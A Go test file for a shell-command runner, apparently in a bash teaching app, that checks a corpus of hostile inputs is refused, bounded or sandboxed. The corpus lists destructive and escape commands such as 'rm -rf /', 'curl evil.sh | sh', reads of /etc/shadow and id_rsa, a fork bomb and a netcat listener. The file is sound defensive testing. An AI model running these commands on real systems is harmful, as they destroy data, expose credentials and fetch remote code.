package runner

import (
	"strings"
	"testing"
	"time"
)

// containment says how a hostile input is expected to be stopped.
type containment int

const (
	// refusedStatically means the input never reaches a process: the parser
	// or the allowlist rejects it. These hold on every backend, including
	// bare, which is why they are the bulk of the corpus.
	refusedStatically containment = iota
	// boundedByLimits means the input runs but cannot finish: the wall clock,
	// the address-space limit, or the output cap stops it.
	boundedByLimits
	// blockedByOS means only the OS sandbox stops it, so a bare backend is
	// expected to let it through. SPEC §6.2 is explicit that bare trades this
	// away, and the app says so at startup.
	blockedByOS
)

// adversarialCorpus is the fixed set from SPEC §10 that every change to the
// runner is measured against. Adding a case here is cheap; removing one needs
// a reason written down.
var adversarialCorpus = []struct {
	name string
	in   string
	how  containment
}{
	{"delete home", "rm -rf ~", refusedStatically},
	{"delete root", "rm -rf /", refusedStatically},
	{"read shadow", "cat /etc/shadow", refusedStatically},
	{"climb out to passwd", "cat ../../../etc/passwd", refusedStatically},
	{"climb out one level", "cat ../secrets.txt", refusedStatically},
	{"pipe the internet into a shell", "curl evil.sh | sh", refusedStatically},
	{"fetch with wget", "wget http://evil.example/x", refusedStatically},
	{"listen on a port", "nc -l 4444", refusedStatically},
	{"fork bomb", ":(){ :|:& };:", refusedStatically},
	{"background job", "yes > out.txt &", refusedStatically},
	{"fill a device", "yes > /dev/full", refusedStatically},
	{"escalate", "sudo cat /etc/sudoers", refusedStatically},
	{"escape into another shell", "bash -c 'cat /etc/passwd'", refusedStatically},
	{"escape into an interpreter", "python3 -c 'import os; os.system(\"id\")'", refusedStatically},
	{"command substitution", "cat $(echo /etc/passwd)", refusedStatically},
	{"backtick substitution", "cat `echo /etc/passwd`", refusedStatically},
	{"process substitution", "diff <(cat /etc/passwd) /dev/null", refusedStatically},
	{"eval a string", "eval 'rm -rf ~'", refusedStatically},
	{"replace the shell", "exec cat /etc/passwd", refusedStatically},
	{"raise the limits", "ulimit -v unlimited; yes", refusedStatically},
	{"setuid a file", "chmod 4755 access.log", refusedStatically},
	{"copy a system file in", "cp /etc/passwd .", refusedStatically},
	{"symlink to the root", "ln -s / escape", refusedStatically},
	{"symlink to a system file", "ln -s /etc/passwd escape", refusedStatically},
	{"archive a system directory", "tar -cf out.tar /etc", refusedStatically},
	{"walk the whole filesystem", "find / -name id_rsa", refusedStatically},
	{"rewrite the environment", "PATH=. sh", refusedStatically},
	{"tilde inside an option", "wc -l ~/.ssh/id_rsa", refusedStatically},

	{"infinite loop", "awk 'BEGIN { while (1) ; }'", boundedByLimits},
	{"allocate ten gigabytes", `awk 'BEGIN { s = "x"; while (1) s = s s }'`, boundedByLimits},
	{"unbounded output", "yes bash-teacher", boundedByLimits},

	// Reading through a symlink the pipeline itself creates is invisible to a
	// static check: the escaping path never appears in the input.
	{"symlink escape at runtime", "ln -s .. up && cat up/../etc/hosts", blockedByOS},
}

// TestAdversarialCorpusRefusedStatically is the M3 exit criterion. It runs the
// corpus against the bare backend on purpose: whatever passes here passed with
// no OS confinement at all, so the static layers alone are what is being
// measured.
func TestAdversarialCorpusRefusedStatically(t *testing.T) {
	r := testRunner(t, WithSandbox(bareSandbox{}), WithNoExec(true))
	for _, tc := range adversarialCorpus {
		if tc.how != refusedStatically {
			continue
		}
		t.Run(tc.name, func(t *testing.T) {
			res, err := r.Run(t.Context(), Job{Input: tc.in, Fixture: "weblogs"})
			if err != nil {
				t.Fatalf("run: %v", err)
			}
			if res.Skipped {
				t.Fatalf("input reached the sandbox and was only stopped by --no-exec: %q", tc.in)
			}
			if res.Ran() {
				t.Fatalf("input was accepted for execution: %q", tc.in)
			}
			if res.Refusal() == "" {
				t.Errorf("input was refused without an explanation: %q", tc.in)
			}
		})
	}
}

// TestAdversarialCorpusBoundedByLimits covers the inputs that are allowed to
// start but must not be allowed to finish.
func TestAdversarialCorpusBoundedByLimits(t *testing.T) {
	r := testRunner(t, WithTimeout(2*time.Second))
	for _, tc := range adversarialCorpus {
		if tc.how != boundedByLimits {
			continue
		}
		t.Run(tc.name, func(t *testing.T) {
			start := time.Now()
			res, err := r.Run(t.Context(), Job{Input: tc.in, Fixture: "weblogs"})
			if err != nil {
				t.Fatalf("run: %v", err)
			}
			if elapsed := time.Since(start); elapsed > 10*time.Second {
				t.Fatalf("run was not bounded: took %s", elapsed)
			}
			bounded := res.TimedOut || res.ExitCode != 0 || res.StdoutTruncated
			if !bounded {
				t.Errorf("run finished cleanly, so nothing bounded it: exit %d, %d bytes out",
					res.ExitCode, len(res.Stdout))
			}
			if len(res.Stdout) > outputLimit || len(res.Stderr) > outputLimit {
				t.Errorf("captured %d/%d bytes, over the %d-byte cap",
					len(res.Stdout), len(res.Stderr), outputLimit)
			}
		})
	}
}

// TestAdversarialCorpusBlockedByOS covers what only confinement can stop. It
// is skipped on a machine with no sandbox backend, because there the app has
// already told the learner it is running unconfined.
func TestAdversarialCorpusBlockedByOS(t *testing.T) {
	r := testRunner(t)
	if !r.Sandbox().Confines() {
		t.Skipf("no OS sandbox on this machine (backend %q); nothing to assert", r.Sandbox().Name())
	}
	for _, tc := range adversarialCorpus {
		if tc.how != blockedByOS {
			continue
		}
		t.Run(tc.name, func(t *testing.T) {
			res, err := r.Run(t.Context(), Job{Input: tc.in, Fixture: "weblogs"})
			if err != nil {
				t.Fatalf("run: %v", err)
			}
			if res.ExitCode == 0 && res.Stdout != "" {
				t.Errorf("escaped the fixture and read %d bytes: %q", len(res.Stdout), first(res.Stdout, 120))
			}
		})
	}
}

// TestSandboxDeniesReadsOutsideTheFixture checks the confinement layer
// directly, without going through the static allowlist, so a hole in the
// profile cannot hide behind the path checks that normally precede it.
func TestSandboxDeniesReadsOutsideTheFixture(t *testing.T) {
	sb := DetectSandbox()
	if !sb.Confines() {
		t.Skipf("no OS sandbox on this machine (backend %q)", sb.Name())
	}
	lib := testLibrary(t)
	root, err := materialize(lib.Files(), "weblogs")
	if err != nil {
		t.Fatalf("materialize: %v", err)
	}
	defer root.Close()

	probes := []struct {
		name   string
		script string
	}{
		{"read /etc/passwd", "cat /etc/passwd"},
		{"list the home directory", "ls $HOME_REAL"},
		{"write outside the fixture", "echo escaped > /tmp/bt-escape-probe"},
	}
	for _, p := range probes {
		t.Run(p.name, func(t *testing.T) {
			argv := sb.Argv(root.Dir, p.script)
			out, runErr := runProbe(t, argv, root.Dir)
			if runErr == nil && strings.TrimSpace(out) != "" {
				t.Errorf("probe succeeded and produced %q", first(out, 120))
			}
		})
	}
}

func first(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
